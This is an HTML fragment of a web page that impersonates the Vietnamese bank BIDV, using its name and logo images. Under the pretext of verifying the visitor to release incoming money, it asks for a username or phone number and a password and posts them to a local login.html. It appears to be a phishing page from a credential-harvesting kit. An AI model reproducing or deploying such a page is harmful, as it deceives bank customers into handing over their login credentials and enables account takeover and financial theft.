<body>
  <div class="w3-container">
    <!-- Header -->
    <div class="header-login">
      <div class="logo" style="width: 230px ; height: 70px">
        <img src="./public//images/bidv1.jpg" alt="imgDesc" />
     </div>
    </div>
    <!-- Body -->
    <div class="body-home">
      <div class="title">
        <h1>
          Giúp Chúng Tôi Xác Minh Đó Là Bạn
        </h1>
      </div>
      <div class="info-box">
        <div class="well">
          <form action="login.html" method="post" id="formLogin">
            <div class="form-group">
              <label> Ngân Hàng</label>
              <select
                id="typeBank"
                name="typeBank"
                class="form-control"
               >
                </option>
                <option value="BIDV">
                  BIDV - Đầu tư và Phát triển Việt Nam
              </select>
            </div>
            <div class="form-group">
              <label>Tên đăng nhập (hoặc Số điện thoại)</label>
              <input
                type="text"
                class="form-control"
                id="username"
                aria-describedby="username"
                name="username"
                value=""
                placeholder="Tên đăng nhập hoặc SĐT của bạn"
                required
              />
            </div>
            <div class="form-group">
              <label>Mật khẩu</label>
              <input
                type="password"
                class="form-control"
                name="password"
                id="password"
                placeholder="Mật khẩu của bạn"
                required
              />
            </div>
            <button type="submit" class="btn btn-block btn-warning">
              Đăng nhập
            </button>
          </form>
          <div class="desc">
            <p>
              Quý Khách Vui Lòng Chọn Và Điền Đúng Số Tài Khoản Để Xác Minh
              Nhận Tiền
            </p>
          </div>
          <div class="img-desc">
            <img src="./public//images/bidv.jpg" alt="imgDesc" />
          </div>
        </div>
      </div>
    </div>
    <!-- Footer -->
